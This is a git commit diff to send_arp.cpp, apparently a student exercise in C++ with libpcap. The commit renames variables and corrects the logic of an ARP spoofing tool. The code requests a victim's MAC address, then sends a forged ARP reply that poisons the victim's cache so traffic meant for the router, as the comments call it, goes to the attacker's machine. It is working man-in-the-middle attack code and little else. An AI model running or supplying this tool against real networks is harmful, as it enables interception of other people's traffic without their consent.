d283313982e7d1cb81bba59c29a2a261f8f57700
ch4rli3kop <pch2180@gmail,com>
2019-08-03 08:32:13 -0700

    change variable

--- send_arp.cpp
+++ send_arp.cpp
@@ -32,7 +32,7 @@ struct arp_header{
     uint8_t tip[4];
 };
 
-void get_smac(char* smac, char* iface){
+void get_mymac(char* mymac, char* iface){
    	int fd;
 	
 	struct ifreq ifr;
@@ -48,7 +48,7 @@ void get_smac(char* smac, char* iface){
 	close(fd);
 	
 	mac = (char *)ifr.ifr_hwaddr.sa_data;
-	for(int i=0; i<6; i++) smac[i] = mac[i];
+	for(int i=0; i<6; i++) mymac[i] = mac[i];
 }
 
 bool check_arp(const u_char* packet){
@@ -67,13 +67,13 @@ void extract_mac(const u_char* packet, uint8_t* tmac){
     for (int i=0; i<6; i++) tmac[i] = arp.smac[i];
 }
 
-void get_tmac(pcap_t* handle, uint8_t* smac, uint8_t* tmac, uint8_t* sip, uint8_t* tip){
+void get_smac(pcap_t* handle, uint8_t* mymac, uint8_t* smac, uint8_t* sip){
     struct ethernet_header eth;
     struct arp_header arp;
     u_char buf[60] = {0};
     // compose ethernet header
     memcpy(eth.dst_mac, "\xff\xff\xff\xff\xff\xff", 6);
-    memcpy(eth.src_mac, smac, 6);
+    memcpy(eth.src_mac, mymac, 6);
     memcpy(eth.type, "\x08\x06", 2);
     // compose arp header
     memcpy(arp.hd_type, "\x00\x01", 2);
@@ -81,10 +81,10 @@ void get_tmac(pcap_t* handle, uint8_t* smac, uint8_t* tmac, uint8_t* sip, uint8_
     arp.hd_len = '\x06';
     arp.pr_len = '\x04';
     memcpy(arp.opcode, "\x00\x01", 2);  // request
-    memcpy(arp.smac, smac, 6);
-    memcpy(arp.sip, sip, 4);
+    memcpy(arp.smac, mymac, 6);
+    memcpy(arp.sip, "\xde\xad\xbe\xef", 4);
     memcpy(arp.tmac, "\x00\x00\x00\x00\x00\x00", 6);
-    memcpy(arp.tip, tip, 4);
+    memcpy(arp.tip, sip, 4);
     
     // compose packet data
     memcpy(buf, &eth, 14);
@@ -106,21 +106,21 @@ void get_tmac(pcap_t* handle, uint8_t* smac, uint8_t* tmac, uint8_t* sip, uint8_
         printf("%u bytes captured\n", header->caplen);
 
         if(check_arp(packet)) {
-            extract_mac(packet, tmac);
+            extract_mac(packet, smac);
             break;
         }
     }
 
 }
 
-void send_fake_packet(pcap_t* handle, uint8_t* smac, uint8_t* tmac, uint8_t* tip){
+void send_fake_packet(pcap_t* handle, uint8_t* mymac, uint8_t* smac, uint8_t* sip, uint8_t* tip){
     struct ethernet_header eth;
     struct arp_header arp;
     
     u_char buf[60] = {0};
     // compose ethernet header
-    memcpy(eth.dst_mac, tmac, 6);
-    memcpy(eth.src_mac, smac, 6);
+    memcpy(eth.dst_mac, smac, 6);
+    memcpy(eth.src_mac, mymac, 6);
     memcpy(eth.type, "\x08\x06", 2);
     // compose arp header
     memcpy(arp.hd_type, "\x00\x01", 2);
@@ -128,10 +128,10 @@ void send_fake_packet(pcap_t* handle, uint8_t* smac, uint8_t* tmac, uint8_t* tip
     arp.hd_len = '\x06';
     arp.pr_len = '\x04';
     memcpy(arp.opcode, "\x00\x02", 2); // reply
-    memcpy(arp.smac, smac, 6);
-    inet_aton("192.168.43.1",(in_addr*)arp.sip);
-    memcpy(arp.tmac, tmac, 6);
-    memcpy(arp.tip, tip, 4);
+    memcpy(arp.smac, mymac, 6);
+    memcpy(arp.sip, tip, 4);
+    memcpy(arp.tmac, smac, 6);
+    memcpy(arp.tip, sip, 4);
     
     // compose packet data
     memcpy(buf, &eth, 14);
@@ -156,14 +156,17 @@ int main(int argc, char* argv[]){
         return 1;
     }
 
-    uint8_t smac[6];
-    uint8_t tmac[6];
-    uint8_t sip[4];
-    uint8_t tip[4];
+    // host me!
+    // sender victim
+    // target generally router
+    uint8_t mymac[6]; // host mac address
+    uint8_t smac[6];  // sender mac address
+    uint8_t sip[4];   // sender ip address
+    uint8_t tip[4];   // target ip address
 
-    // get sender mac address
-    get_smac((char*)smac, argv[1]);
-    printf("[+] my MAC => %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , smac[0], smac[1], smac[2], smac[3], smac[4], smac[5]);
+    // get my mac address
+    get_mymac((char*)mymac, argv[1]);
+    printf("[+] my MAC => %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mymac[0], mymac[1], mymac[2], mymac[3], mymac[4], mymac[5]);
 
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -173,15 +176,15 @@ int main(int argc, char* argv[]){
         return -1;    
     }
     
-    inet_aton(argv[2], (in_addr*)sip);
-    inet_aton(argv[3], (in_addr*)tip);    
+    inet_aton(argv[2], (in_addr*)sip); // victim
+    inet_aton(argv[3], (in_addr*)tip); // router 
 
-    // send arp packet && get target mac address
-    get_tmac(handle, smac, tmac, sip, tip);
-    printf("[+] target MAC => %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", tmac[0], tmac[1], tmac[2], tmac[3], tmac[4], tmac[5]);
+    // send arp packet && get sender mac address
+    get_smac(handle, mymac, smac, sip);
+    printf("[+] sender (victim) MAC => %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", smac[0], smac[1], smac[2], smac[3], smac[4], smac[5]);
     
     // send fake reply && initialize target arp cache table
-    send_fake_packet(handle, smac, tmac, tip);
+    send_fake_packet(handle, mymac, smac, sip, tip);
    
     return 0;
 }
